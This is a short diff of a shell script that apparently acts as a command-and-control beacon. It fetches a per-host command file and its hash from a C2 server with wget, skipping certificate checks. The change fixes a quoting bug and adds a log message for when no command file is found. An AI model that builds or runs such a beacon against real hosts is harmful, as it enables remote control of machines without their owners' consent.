@@ -13,13 +13,15 @@ CONFIG
 
 # Download a command file, if there's one there
 $WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
-if [ -f "$LOKIHOME/$MYNAME-command.txt " ]; then 
-    # If we downloaded a file, download the hash for it 
-	$LOG "Downloaded $LOKIHOME/$MYNAME-command.txt, checking for $C2PROTO$C2/$MYNAME.hash"
-	$WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
-	
-	# Create a hash of the file that we downloaded to compare to the hash that we downloaded
+if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
+    # If we downloaded a file, download the hash for it
+        $ECHO "Downloaded $LOKIHOME/$MYNAME-command.txt, checking for $C2PROTO$C2/$MYNAME.hash"
+        $WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate "$C2PROTO$C2/$MYNAME.hash"
+
+        # Create a hash of the file that we downloaded to compare to the hash that we downloaded
     sha256sum $LOKIHOME/$MYNAME-command.txt > $LOKIHOME/$MYNAME-command.check
+else
+    $ECHO "No $LOKIHOME/$MYNAME-command.txt found"
 fi
 
 
